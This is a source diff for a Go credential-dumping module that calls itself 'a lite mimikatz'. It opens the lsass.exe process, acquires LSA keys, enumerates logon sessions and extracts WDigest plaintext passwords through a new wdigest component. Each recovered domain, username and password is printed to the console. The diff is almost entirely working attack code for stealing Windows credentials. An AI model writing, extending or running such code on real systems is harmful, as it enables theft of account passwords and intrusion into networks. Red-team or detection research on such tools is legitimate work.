@@ -17,6 +17,9 @@ import (
 	"project/internal/random"
 )
 
+// ErrKiwiClosed is an error about closed.
+var ErrKiwiClosed = fmt.Errorf("kiwi module is closed")
+
 // Kiwi is a lite mimikatz.
 type Kiwi struct {
 	logger logger.Logger
@@ -36,9 +39,7 @@ type Kiwi struct {
 	session *session
 	lsaNT5  *lsaNT5
 	lsaNT6  *lsaNT6
-
-	wdigestPrimaryOffset int
-	wdigestCredAddr      uintptr
+	wdigest *wdigest
 
 	// kiwi status
 	closed    bool
@@ -78,6 +79,7 @@ func NewKiwi(lg logger.Logger) (*Kiwi, error) {
 	}
 	kiwi.lsass = newLsass(kiwi)
 	kiwi.session = newSession(kiwi)
+	kiwi.wdigest = newWdigest(kiwi)
 	kiwi.context, kiwi.cancel = context.WithCancel(context.Background())
 	return kiwi, nil
 }
@@ -113,23 +115,31 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	}
 	defer api.CloseHandle(pHandle)
 	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
-	sessions, err := kiwi.session.GetLogonSessionList(pHandle)
-	if err != nil {
-		return nil, err
-	}
 	err = kiwi.acquireLSAKeys(pHandle)
 	if err != nil {
 		return nil, errors.WithMessage(err, "failed to acquire LSA keys")
 	}
+	sessions, err := kiwi.session.GetLogonSessionList(pHandle)
+	if err != nil {
+		return nil, err
+	}
 	for _, session := range sessions {
+		fmt.Println()
 		fmt.Println("Domain:", session.Domain)
 		fmt.Println("Username:", session.Username)
 		fmt.Println("Logon server:", session.LogonServer)
 		fmt.Println("SID:", session.SID)
-		fmt.Println()
-		if session.Username == "Admin" {
-			kiwi.getWdigestList(pHandle, session.LogonID)
+		cred, err := kiwi.wdigest.GetPassword(pHandle, session.LogonID)
+		if err != nil {
+			return nil, err
 		}
+		if cred == nil {
+			continue
+		}
+		fmt.Println("  wdigest:")
+		fmt.Println("    *Domain:", cred.Domain)
+		fmt.Println("    *Username:", cred.Username)
+		fmt.Println("    *Password:", cred.Password)
 	}
 	return nil, nil
 }
@@ -146,13 +156,8 @@ func (kiwi *Kiwi) acquireLSAKeys(pHandle windows.Handle) error {
 }
 
 // Close is used to close kiwi module.
-func (kiwi *Kiwi) Close() {
+func (kiwi *Kiwi) Close() error {
 	kiwi.cancel()
-	kiwi.mu.Lock()
-	defer kiwi.mu.Unlock()
-	if kiwi.closed {
-		return
-	}
 	kiwi.lsass.Close()
 	kiwi.session.Close()
 	if kiwi.lsaNT5 != nil {
@@ -161,5 +166,6 @@ func (kiwi *Kiwi) Close() {
 	if kiwi.lsaNT6 != nil {
 		kiwi.lsaNT6.Close()
 	}
-	kiwi.closed = true
+	kiwi.wdigest.Close()
+	return nil
 }
